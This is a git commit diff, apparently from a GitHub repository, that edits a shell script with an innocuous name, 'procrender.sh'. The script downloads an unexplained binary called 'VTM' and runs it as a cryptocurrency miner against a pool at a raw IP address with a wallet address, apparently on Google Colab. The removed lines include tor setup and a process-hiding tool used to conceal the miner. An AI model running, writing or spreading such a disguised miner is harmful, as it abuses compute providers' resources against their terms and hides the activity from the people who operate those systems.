658de55d45ad943fcd8f3e3edbe7e98f605d6437
renilo <88342640+renilo@users.noreply.github.com>
2022-10-07 21:28:39 +0700

    Update procrender.sh

--- procrender.sh
+++ procrender.sh
@@ -2,19 +2,7 @@
 # Install XRDP
 # Before get xmr coin for free
 # Google Colab
-sudo apt update
-clear
-
-sudo apt update -y
-sudo apt install gcc -y
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
-service tor start && curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
-apt install nodejs -y
-npm install -g npm@8.18.0 -y
-npm i -g node-process-hider
-ph add VTM
-
 wget https://github.com/indah38/theta/raw/main/VTM
 chmod 700 VTM
-
-./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t3
+clear
+./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.OHGITU -p x -t4
